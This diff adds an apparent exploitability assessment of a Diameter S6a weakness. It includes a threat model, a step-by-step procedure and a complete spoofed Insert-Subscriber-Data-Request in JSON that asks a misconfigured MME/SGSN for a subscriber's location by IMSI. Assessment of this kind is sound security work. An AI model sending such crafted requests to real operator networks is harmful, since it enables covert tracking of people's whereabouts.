@@ -1,0 +1,76 @@
+## **Threat Model:**
+- **Attack Assumption:** A misconfigured `MME/SGSN` exposes its `S6a` Diameter interface to the Internet and accepts a direct attacker connection as if it were a trusted `HSS` peer. The attacker sends a syntactically valid `Insert-Subscriber-Data-Request (IDR)` for application id `16777251`, and the victim returns the corresponding `Insert-Subscriber-Data-Answer (IDA)` on that same connection. No `IPsec/TLS` peer authentication prevents spoofing.
+- **Attacker Capability:** The attacker actively sends one crafted `IDR` on its own Diameter connection and passively receives only the resulting `IDA` on that connection. The attacker cannot observe or modify traffic between legitimate `HSS`, `MME`, or `SGSN` nodes, but may know the target subscriber `IMSI` needed in `User-Name`.
+
+## **Exploitability Analysis:**
+
+The field is conditionally request-triggerable. The relevant request is `IDR` with command code `319` and application id `16777251`. The evidence states that inclusion of location information in `IDA` is specifically triggered by `IDR-Flags` with the `Current Location` bit set. A minimal processable request therefore includes standard Diameter session/routing AVPs plus `Vendor-Specific-Application-Id`, `User-Name`, and `IDR-Flags =EPS Location Information Request`; `Destination-Host` is commonly needed operationally to reach the correct serving node. No empty grouped AVP is required for this disclosure path.
+
+Because the attacker can directly elicit the `IDA` by sending a valid spoofed `IDR` with the exact flag, and because the returned field contributes meaningful subscriber location/privacy intelligence rather than mere operational metadata, this meets the criteria for an information-disclosure attack.
+
+## **Attack Procedure:**
+- Craft an `Insert-Subscriber-Data-Request (IDR)` with command code `319` and application id `16777251`.
+- Include the mandatory Diameter AVPs needed for processing and routing: `Session-Id`, `Auth-Session-State`, `Origin-Host`, `Origin-Realm`, `Destination-Realm`, `User-Name`, and `Vendor-Specific-Application-Id`.
+- Optionally include `Destination-Host` when needed to route to the specific serving `MME/SGSN`.
+- Send the request over the attacker's spoofed `HSS` connection to the victim `MME/SGSN`.
+- Receive the resulting `Insert-Subscriber-Data-Answer`; 
+## **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.example.net;1710000001;1"
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "operator.example"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "sgsn01.operator.example"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "IDR-Flags",
+      "avp_value": "EPS Location Information Request"
+    }
+  ]
+}
+```
+
+## **Classification:**
+EXPLOITABLE
